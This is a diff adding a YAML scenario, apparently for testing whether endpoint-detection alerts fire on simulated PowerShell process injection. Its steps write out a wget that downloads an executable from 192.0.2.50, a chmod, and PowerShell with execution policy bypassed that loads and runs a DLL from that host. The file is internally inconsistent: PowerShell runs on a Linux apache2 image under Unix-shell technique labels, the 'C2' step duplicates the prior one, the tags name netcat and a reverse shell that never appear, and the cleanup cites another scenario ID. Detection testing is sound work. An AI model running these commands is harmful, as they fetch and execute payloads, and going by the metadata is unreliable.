@@ -1,0 +1,135 @@
+scenario_id: SIM-EDR-304
+name: Unsigned Process Injection via PowerShell
+version: '1.0'
+status: active
+plane: EDR
+detection_types:
+- BIOC
+- XQL
+- IOC
+- ABIOC
+uc_ref: UCS-EDR-02
+tc_ref: TC-EDR-03
+tc_refs:
+- TC-EDR-03
+- TC-EDR-05
+pov_scenario_id: POV-SC-021
+uc_name: Endpoint Detection & Response
+tc_name: Validate multi-method malware detection (local sandbox, behavioral, static analysis)
+mitre_tactic: TA0011
+mitre_tactic_name: Command and Control
+mitre_technique: T1059.004
+mitre_technique_name: 'Command and Scripting Interpreter: Unix Shell'
+additional_techniques:
+- technique: T1071.001
+  name: 'Application Layer Protocol: Web Protocols'
+- technique: T1059.006
+  name: 'Command and Scripting Interpreter: Python'
+threat_report: Unit42 - Mirai Variant Targets Linux and IoT Devices
+threat_report_url: https://unit42.paloaltonetworks.com/mirai-variant-v3g4/
+execution_identity:
+  default: www-data
+  options:
+  - www-data
+  - node
+  - nobody
+  - root
+push_supported: true
+pull_supported: true
+validation_methodology: Endpoint Signal Injection & Detection Accuracy
+methodology_family: F1
+primary_kpi: MTTD
+threshold:
+  kpi: MTTD
+  op: ≤
+  value: 300
+  unit: seconds
+success_criteria: 'The endpoint TTP signals injected by this scenario produce the expected
+
+  XDR BIOC / XQL detections, and the mean time from signal emit to alert
+
+  creation is within the MTTD budget. Each step''s expected_detections row is
+
+  validated against dataset=xdr_data.
+
+  '
+moat_tier: LEAD
+cgo_anchor:
+  image_name: apache2
+  primary_username: www-data
+external_tools:
+- name: Atomic Red Team
+  source: https://github.com/redcanaryco/atomic-red-team
+  type: script
+  install_inline: false
+  adapter_ref: TOOL-ATOMIC-RED-TEAM
+steps:
+- id: step-01
+  name: Download Malware
+  command: wget -O /tmp/evil.exe http://192.0.2.50/malware.exe
+  identity: www-data
+  mitre_technique: T1059
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Unsigned and Unpopular Process Injection
+    ttp_ref: TTP-2026-0466
+    detection_id: bioc-unsigned-and-unpopular-process-injection
+- id: step-02
+  name: Stub Execution Permissions
+  command: stub chmod +x /tmp/evil.exe
+  identity: www-data
+  mitre_technique: T1059
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Unsigned and Unpopular Process Injection
+    ttp_ref: TTP-2026-0466
+    detection_id: bioc-unsigned-and-unpopular-process-injection
+  causality:
+    parent_step: step-01
+    pivot: process_lineage
+- id: step-03
+  name: Execute Injection via PowerShell
+  command: powershell.exe -ExecutionPolicy Bypass -Command "[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('\\192.0.2.50\\payload.dll'));
+    [Payload.Main]::Run()"
+  identity: www-data
+  mitre_technique: T1055
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Unsigned and Unpopular Process Injection
+    ttp_ref: TTP-2026-0466
+    detection_id: bioc-unsigned-and-unpopular-process-injection
+  causality:
+    parent_step: step-02
+    pivot: process_lineage
+- id: step-04
+  name: Establish C2 Connection
+  command: powershell.exe -ExecutionPolicy Bypass -Command "[System.Reflection.Assembly]::Load([System.IO.File]::ReadAllBytes('\\192.0.2.50\\payload.dll'));
+    [Payload.Main]::Run()"
+  identity: www-data
+  mitre_technique: T1070
+  expected_detections:
+  - plane: EDR
+    type: BIOC
+    description: Unsigned and Unpopular Process Injection
+    ttp_ref: TTP-2026-0466
+    detection_id: bioc-unsigned-and-unpopular-process-injection
+  causality:
+    parent_step: step-03
+    pivot: process_lineage
+cleanup:
+  commands:
+  - echo '[CortexSim] SIM-EDR-002 cleanup complete — no artifacts to remove (all simulated to localhost)'
+author: Henry Reed
+created: '2026-04-14'
+last_updated: '2026-04-14'
+tags:
+- reverse-shell
+- command-and-control
+- c2-callback
+- endpoint-security
+- bash
+- python
+- netcat
